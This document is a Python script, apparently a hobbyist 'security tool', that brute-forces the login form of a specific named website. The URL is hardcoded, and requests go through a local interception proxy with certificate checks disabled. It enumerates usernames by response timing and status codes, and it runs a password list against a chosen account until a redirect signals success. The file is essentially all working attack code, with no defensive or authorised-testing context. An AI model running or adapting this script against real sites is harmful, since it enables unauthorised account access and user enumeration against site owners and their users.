import time
import requests
import os
from colorama import Fore, Back, Style
from src import artwork


print(Fore.BLUE+artwork.balluk_art)
print()
print()
print()
print(Fore.YELLOW+"---------------------Hello, welcome to Bulluk security tool------------------------")
print()   
print(Fore.YELLOW+"------------------------https://github.com/ballukpy--------------------------------")
print()
print(Fore.RED+"---------------------------The more anonymous safer---------------------------------")
print()
class brutforc:
    def __init__(self):    #creat word list
        self.wordlist_dict = {}

    def create_wordlist_dict(self, username_file, password_file):
        with open(username_file, 'r') as user_file, open(password_file, 'r') as pass_file:
            self.usernames = user_file.read().splitlines()
            self.passwords = pass_file.read().splitlines()

            for username, password in zip(self.usernames, self.passwords):
                self.wordlist_dict[username] = password

        return self.wordlist_dict

    def login(self):     #login in site
        self.url = 'http://cmid.ir/samane/login.php?redirect=cp.php'
        proxy = 'http://127.0.0.1:8080'  
        #set proxy for brupsuit
        self.proxies = {
            "http" : proxy,"https":proxy
        }
        # #for linux mitm certificate
        # cer_file=r"~/. mitmproxy/mitmproxy-ca-cert.cer" 
	    # proxies = {
		#     'http': proxy,
		#     'https': proxy
	    #     }
        i=0  #count for test
        self.porsesh_ellahi=input(Fore.CYAN+"if wanna use word list for user enumeration press 1 if wanna bruteforc with passwd list insert username: ")
        #ask for wich one is user wanna use word list or user
        if self.porsesh_ellahi == str(1):
            self.he_pick_word_list()
        else:
            self.she_pick_username(self.porsesh_ellahi)
    def she_pick_username(self,jvb_porseh_ellahi):
        for passwd in self.passwords:
            login_data = {
                'username': jvb_porseh_ellahi,
                'password': passwd
            }
            print(login_data)

            start_time = time.time()  # زمان شروع پردازش درخواست
            response = requests.post(self.url, data=login_data)
            end_time = time.time()  # زمان پایان پردازش درخواست

            processing_time = end_time - start_time  # محاسبه زمان پردازش
            response = requests.post(self.url, data=login_data , proxies=self.proxies , verify=False)
        
            filterd_processing_time= "%.2f" % processing_time
            # if int(response.status_code) != 200 or float(filterd_processing_time) > 1.5 : 
            #     print(f"{Fore.GREEN}proctime password {passwd}:  { filterd_processing_time} sec -----> status code is {response.status_code}")
            #     print("------------------------")
            #     print('Request URL:\n', response.url,)

            #     print('Response Headers:\n')
            #     for header, value in response.headers.items():
            #         print(f'{header}: {value}')
            #     print(Fore.RED+"|-----------------------------------------|")
            
            if int(response.status_code) == 302:
                print('Login successful!')
                print(f"{Fore.GREEN}proctime password {passwd}:  { filterd_processing_time} sec -----> status code is {response.status_code}")
                print(login_data)
                break

            else:
                print(f"{Fore.GREEN}proctime password {passwd}:  { filterd_processing_time} sec -----> status code is {response.status_code}")
                print(Fore.RED+'Login failed.')
    
    
    
    def he_pick_word_list(self):
        i=0
        for username in self.usernames:
            login_data = {
                'username': username,
                'password': "password"
            }
            # print(login_data)

            start_time = time.time()  # زمان شروع پردازش درخواست
            response = requests.post(self.url, data=login_data)
            end_time = time.time()  # زمان پایان پردازش درخواست

            processing_time = end_time - start_time  # محاسبه زمان پردازش
            response = requests.post(self.url, data=login_data , proxies=self.proxies , verify=False)
        
            filterd_processing_time= "%.2f" % processing_time
            if int(response.status_code) != 200 or float(filterd_processing_time) > 1.5 : 
                print(f"{Fore.GREEN}proctime {username}:  { filterd_processing_time} sec -----> status code is {response.status_code}")
                print("------------------------")
                print('Request URL:\n', response.url,)

                print('Response Headers:\n')
                for header, value in response.headers.items():
                    print(f'{header}: {value}')
                print(Fore.RED+"|-----------------------------------------|")
                # if response.status_code == 302:   #this code fo passwd
                #     print('Login successful!')
                # # print(login_data)

                # else:
                #     print('Login failed.')
            else:
                i+=1
                print(i)

    def start_attack(self, username_file, password_file):
        '''    Love is wide ocean that joins two shores    '''
        
        self.create_wordlist_dict(username_file, password_file)
        self.login()


username_file = r'C:\Users\navid\Desktop\python\git _brutforce\username.txt'
password_file = r'C:\Users\navid\Desktop\python\git _brutforce\passwd.txt'
br = brutforc()
br.start_attack(username_file, password_file)